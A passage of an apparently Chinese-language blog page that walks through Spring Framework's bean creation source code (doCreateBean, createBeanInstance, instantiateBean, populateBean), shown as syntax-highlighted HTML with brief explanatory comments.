keyword">new</span> <span class="token class-name">BeanCreationException</span><span class="token punctuation">(</span>mbd<span class="token punctuation">.</span><span class="token function">getResourceDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> beanName<span class="token punctuation">,</span>                            <span class="token string">"Post-processing of merged bean definition failed"</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                mbd<span class="token punctuation">.</span>postProcessed <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 解决循环依赖</span>        <span class="token comment" spellcheck="true">// Eagerly cache singletons to be able to resolve circular references</span>        <span class="token comment" spellcheck="true">// even when triggered by lifecycle interfaces like BeanFactoryAware.</span>        <span class="token keyword">boolean</span> earlySingletonExposure <span class="token operator">=</span> <span class="token punctuation">(</span>mbd<span class="token punctuation">.</span><span class="token function">isSingleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>allowCircularReferences <span class="token operator">&amp;&amp;</span>                <span class="token function">isSingletonCurrentlyInCreation</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>earlySingletonExposure<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isTraceEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                logger<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">"Eagerly caching bean '"</span> <span class="token operator">+</span> beanName <span class="token operator">+</span>                        <span class="token string">"' to allow for resolving potential circular references"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token function">addSingletonFactory</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">getEarlyBeanReference</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> mbd<span class="token punctuation">,</span> bean<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Initialize the bean instance.</span>        Object exposedObject <span class="token operator">=</span> bean<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 填充bean</span>            <span class="token function">populateBean</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> mbd<span class="token punctuation">,</span> instanceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 真正的实例化对象</span>            exposedObject <span class="token operator">=</span> <span class="token function">initializeBean</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> exposedObject<span class="token punctuation">,</span> mbd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>ex <span class="token keyword">instanceof</span> <span class="token class-name">BeanCreationException</span> <span class="token operator">&amp;&amp;</span> beanName<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>BeanCreationException<span class="token punctuation">)</span> ex<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBeanName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">throw</span> <span class="token punctuation">(</span>BeanCreationException<span class="token punctuation">)</span> ex<span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanCreationException</span><span class="token punctuation">(</span>                        mbd<span class="token punctuation">.</span><span class="token function">getResourceDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> beanName<span class="token punctuation">,</span> <span class="token string">"Initialization of bean failed"</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>earlySingletonExposure<span class="token punctuation">)</span> <span class="token punctuation">{</span>            Object earlySingletonReference <span class="token operator">=</span> <span class="token function">getSingleton</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>earlySingletonReference <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>exposedObject <span class="token operator">==</span> bean<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    exposedObject <span class="token operator">=</span> earlySingletonReference<span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>allowRawInjectionDespiteWrapping <span class="token operator">&amp;&amp;</span> <span class="token function">hasDependentBean</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    String<span class="token punctuation">[</span><span class="token punctuation">]</span> dependentBeans <span class="token operator">=</span> <span class="token function">getDependentBeans</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>                    Set<span class="token operator">&lt;</span>String<span class="token operator">></span> actualDependentBeans <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedHashSet</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>dependentBeans<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span>String dependentBean <span class="token operator">:</span> dependentBeans<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">removeSingletonIfCreatedForTypeCheckOnly</span><span class="token punctuation">(</span>dependentBean<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            actualDependentBeans<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>dependentBean<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>actualDependentBeans<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanCurrentlyInCreationException</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span>                                <span class="token string">"Bean with name '"</span> <span class="token operator">+</span> beanName <span class="token operator">+</span> <span class="token string">"' has been injected into other beans ["</span> <span class="token operator">+</span>                                StringUtils<span class="token punctuation">.</span><span class="token function">collectionToCommaDelimitedString</span><span class="token punctuation">(</span>actualDependentBeans<span class="token punctuation">)</span> <span class="token operator">+</span>                                <span class="token string">"] in its raw version as part of a circular reference, but has eventually been "</span> <span class="token operator">+</span>                                <span class="token string">"wrapped. This means that said other beans do not use the final version of the "</span> <span class="token operator">+</span>                                <span class="token string">"bean. This is often the result of over-eager type matching - consider using "</span> <span class="token operator">+</span>                                <span class="token string">"'getBeanNamesOfType' with the 'allowEagerInit' flag turned off, for example."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Register bean as disposable.</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 注册bean- 销毁</span>            <span class="token function">registerDisposableBeanIfNecessary</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> bean<span class="token punctuation">,</span> mbd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">BeanDefinitionValidationException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanCreationException</span><span class="token punctuation">(</span>                    mbd<span class="token punctuation">.</span><span class="token function">getResourceDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> beanName<span class="token punctuation">,</span> <span class="token string">"Invalid destruction signature"</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> exposedObject<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h3 id="2、初始化bean"><a href="#2、初始化bean" class="headerlink" title="2、初始化bean"></a>2、初始化bean</h3><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/**     * Create a new instance for the specified bean, using an appropriate instantiation strategy:     * factory method, constructor autowiring, or simple instantiation.     * @param beanName the name of the bean     * @param mbd the bean definition for the bean     * @param args explicit arguments to use for constructor or factory method invocation     * @return a BeanWrapper for the new instance     * @see #obtainFromSupplier     * @see #instantiateUsingFactoryMethod     * @see #autowireConstructor     * @see #instantiateBean     */</span>    <span class="token keyword">protected</span> BeanWrapper <span class="token function">createBeanInstance</span><span class="token punctuation">(</span>String beanName<span class="token punctuation">,</span> RootBeanDefinition mbd<span class="token punctuation">,</span> <span class="token annotation punctuation">@Nullable</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Make sure bean class is actually resolved at this point.</span>        Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> beanClass <span class="token operator">=</span> <span class="token function">resolveBeanClass</span><span class="token punctuation">(</span>mbd<span class="token punctuation">,</span> beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>beanClass <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Modifier<span class="token punctuation">.</span><span class="token function">isPublic</span><span class="token punctuation">(</span>beanClass<span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>mbd<span class="token punctuation">.</span><span class="token function">isNonPublicAccessAllowed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanCreationException</span><span class="token punctuation">(</span>mbd<span class="token punctuation">.</span><span class="token function">getResourceDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> beanName<span class="token punctuation">,</span>                    <span class="token string">"Bean class isn't public, and non-public access not allowed: "</span> <span class="token operator">+</span> beanClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        Supplier<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> instanceSupplier <span class="token operator">=</span> mbd<span class="token punctuation">.</span><span class="token function">getInstanceSupplier</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>instanceSupplier <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">obtainFromSupplier</span><span class="token punctuation">(</span>instanceSupplier<span class="token punctuation">,</span> beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>mbd<span class="token punctuation">.</span><span class="token function">getFactoryMethodName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">instantiateUsingFactoryMethod</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> mbd<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Shortcut when re-creating the same bean...</span>        <span class="token keyword">boolean</span> resolved <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">boolean</span> autowireNecessary <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>args <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>mbd<span class="token punctuation">.</span>constructorArgumentLock<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>mbd<span class="token punctuation">.</span>resolvedConstructorOrFactoryMethod <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    resolved <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                    autowireNecessary <span class="token operator">=</span> mbd<span class="token punctuation">.</span>constructorArgumentsResolved<span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>resolved<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>autowireNecessary<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token function">autowireConstructor</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> mbd<span class="token punctuation">,</span> null<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token function">instantiateBean</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> mbd<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Candidate constructors for autowiring?</span>        Constructor<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">]</span> ctors <span class="token operator">=</span> <span class="token function">determineConstructorsFromBeanPostProcessors</span><span class="token punctuation">(</span>beanClass<span class="token punctuation">,</span> beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>ctors <span class="token operator">!=</span> null <span class="token operator">||</span> mbd<span class="token punctuation">.</span><span class="token function">getResolvedAutowireMode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> AUTOWIRE_CONSTRUCTOR <span class="token operator">||</span>                mbd<span class="token punctuation">.</span><span class="token function">hasConstructorArgumentValues</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span>ObjectUtils<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">autowireConstructor</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> mbd<span class="token punctuation">,</span> ctors<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Preferred constructors for default construction?</span>        ctors <span class="token operator">=</span> mbd<span class="token punctuation">.</span><span class="token function">getPreferredConstructors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>ctors <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">autowireConstructor</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> mbd<span class="token punctuation">,</span> ctors<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// No special handling: simply use no-arg constructor.</span>        <span class="token comment" spellcheck="true">// 用无参构造初始化</span>        <span class="token keyword">return</span> <span class="token function">instantiateBean</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> mbd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token comment" spellcheck="true">/**     * Instantiate the given bean using its default constructor.     * @param beanName the name of the bean     * @param mbd the bean definition for the bean     * @return a BeanWrapper for the new instance     */</span>    <span class="token keyword">protected</span> BeanWrapper <span class="token function">instantiateBean</span><span class="token punctuation">(</span><span class="token keyword">final</span> String beanName<span class="token punctuation">,</span> <span class="token keyword">final</span> RootBeanDefinition mbd<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            Object beanInstance<span class="token punctuation">;</span>            <span class="token keyword">final</span> BeanFactory parent <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>System<span class="token punctuation">.</span><span class="token function">getSecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                beanInstance <span class="token operator">=</span> AccessController<span class="token punctuation">.</span><span class="token function">doPrivileged</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PrivilegedAction<span class="token operator">&lt;</span>Object<span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span>                        <span class="token function">getInstantiationStrategy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">instantiate</span><span class="token punctuation">(</span>mbd<span class="token punctuation">,</span> beanName<span class="token punctuation">,</span> parent<span class="token punctuation">)</span><span class="token punctuation">,</span>                        <span class="token function">getAccessControlContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 这里使用了策略模式，先去获取策略，然后用反射创建实例对象</span>                beanInstance <span class="token operator">=</span> <span class="token function">getInstantiationStrategy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">instantiate</span><span class="token punctuation">(</span>mbd<span class="token punctuation">,</span> beanName<span class="token punctuation">,</span> parent<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 将bean对象使用BeanWrapper包装</span>            BeanWrapper bw <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BeanWrapperImpl</span><span class="token punctuation">(</span>beanInstance<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">initBeanWrapper</span><span class="token punctuation">(</span>bw<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> bw<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanCreationException</span><span class="token punctuation">(</span>                    mbd<span class="token punctuation">.</span><span class="token function">getResourceDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> beanName<span class="token punctuation">,</span> <span class="token string">"Instantiation of bean failed"</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><h3 id="3、填充属性"><a href="#3、填充属性" class="headerlink" title="3、填充属性"></a>3、填充属性</h3><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/**     * Populate the bean instance in the given BeanWrapper with the property values     * from the bean definition.     * @param beanName the name of the bean     * @param mbd the bean definition for the bean     * @param bw the BeanWrapper with bean instance     */</span>    <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"deprecation"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// for postProcessPropertyValues</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">populateBean</span><span class="token punctuation">(</span>String beanName<span class="token punctuation">,</span> RootBeanDefinition mbd<span class="token punctuation">,</span> <span class="token annotation punctuation">@Nullable</span> BeanWrapper bw<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>bw <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>mbd<span class="token punctuation">.</span><span class="token function">hasPropertyValues</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanCreationException</span><span class="token punctuation">(</span>                        mbd<span class="token punctuation">.</span><span class="token function">getResourceDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> beanName<span class="token punctuation">,</span> <span class="token string">"Cannot apply property values to null instance"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// Skip property population phase for null instance.</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Give any InstantiationAwareBeanPostProcessors the opportunity to modify the</span>        <span class="token comment" spellcheck="true">// state of the bean before properties are set. This can be used, for example,</span>        <span class="token comment" spellcheck="true">// to support styles of field injection.</span>        <span class="token keyword">boolean</span> continueWithPropertyPopulation <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>mbd<span class="token punctuation">.</span><span class="token function">isSynthetic</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">hasInstantiationAwareBeanPostProcessors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>BeanPostProcessor bp <span class="token operator">:</span> <span class="token function">getBeanPostProcessors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>bp <span class="token keyword">instanceof</span> <span class="token class-name">InstantiationAwareBeanPostProcessor</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    InstantiationAwareBeanPostProcessor ibp <span class="token operator">=</span> <span class="token punctuation">(</span>InstantiationAwareBeanPostProcessor<span class="token punctuation">)</span> bp<span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ibp<span class="token punctuation">.</span><span class="token function">postProcessAfterInstantiation</span><span class="token punctuation">(</span>bw<span class="token punctuation">.</span><span class="token function">getWrappedInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> beanName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        continueWithPropertyPopulation <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                        <span class="token keyword">break</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>continueWithPropertyPopulation<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        PropertyValues pvs <span class="token operator">=</span> <span class="token punctuation">(</span>mbd<span class="token punctuation">.</span><span class="token function">hasPropertyValues</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> mbd<span class="token punctuation">.</span><span class="token function">getPropertyValues</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>mbd<span class="token punctuation">.</span><span class="token function">getResolvedAutowireMode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> AUTOWIRE_BY_NAME <span class="token operator">||</span> mbd<span class="token punctuation">.</span><span class="token function">getResolvedAutowireMode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> AUTOWIRE_BY_TYPE<span class="token punctuation">)</span> <span class="token punctuation">{</span>            MutablePropertyValues newPvs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MutablePropertyValues</span><span class="token punctuation">(</span>pvs<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// Add property values based on autowire by name if applicable.</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>mbd<span class="token punctuation">.</span><span class="token function">getResolvedAutowireMode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> AUTOWIRE_BY_NAME<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">autowireByName</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> mbd<span class="token punctuation">,</span> bw<span class="token punctuation">,</span> newPvs<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// Add property values based on autowire by type if applicable.</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>mbd<span class="token punctuation">.</span><span class="token function">getResolvedAutowireMode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> AUTOWIRE_BY_TYPE<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">autowireByType</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> mbd<span class="token punctuation">,</span> bw<span class="token punctuation">,</span> newPvs<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            pvs <span class="token operator">=</span> newPvs<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">boolean</span> hasInstAwareBpps <span class="token operator">=</span> <span class="token function">hasInstantiationAwareBeanPostProcessors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">boolean</span> needsDepCheck <span class="token operator">=</span> <span class="token punctuation">(</span>mbd<span class="token punctuation">.</span><span class="token function">getDependencyCheck</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> AbstractBeanDefinition<span class="token punctuation">.</span>DEPENDENCY_CHECK_NONE<span class="token punctuation">)</span><span class="token punctuation">;</span>        PropertyDescriptor<span class="token punctuation">[</span><span class="token punctuation">]</span> filteredPds <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>hasInstAwareBpps<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>pvs <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                pvs <span class="token operator">=</span> mbd<span class="token punctuation">.</span><span class="token function">getPropertyValues</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>BeanPostProcessor bp <span class="token operator">:</span> <span class="token function">getBeanPostProcessors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>bp <span class="token keyword">instanceof</span> <span class="token class-name">InstantiationAwareBeanPostProcessor</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    InstantiationAwareBeanPostProcessor ibp <span class="token operator">=</span> <span class="token punctuation">(</span>InstantiationAwareBeanPostProcessor<span class="token punctuation">)</span> bp<span class="token punctuation">;</span>                    PropertyValues pvsToUse <span class="token operator">=</span> ibp<span class="token punctuation">.</span><span class="token function">postProcessProperties</span><span class="token punctuation">(</span>pvs<span class="token punctuation">,</span> bw<span class="token punctuation">.</span><span class="token function">getWrappedInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>pvsToUse <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>filteredPds <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token 